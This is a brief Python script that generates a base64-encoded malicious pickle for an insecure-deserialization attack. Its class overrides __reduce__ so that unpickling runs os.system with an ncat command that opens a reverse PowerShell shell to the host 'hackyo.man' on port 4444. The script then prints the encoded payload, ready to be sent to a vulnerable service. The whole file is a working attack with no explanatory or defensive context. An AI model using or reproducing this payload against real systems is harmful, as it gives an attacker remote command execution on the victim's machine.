import pickle
import base64

class GNAT:
	def __reduce__(self):
		import os
		return(
				os.system, ('ncat -e powershell.exe hackyo.man 4444', 
					)

			)
serialized = pickle.dumps(GNAT())

encoded = base64.b64encode(serialized)

print(encoded)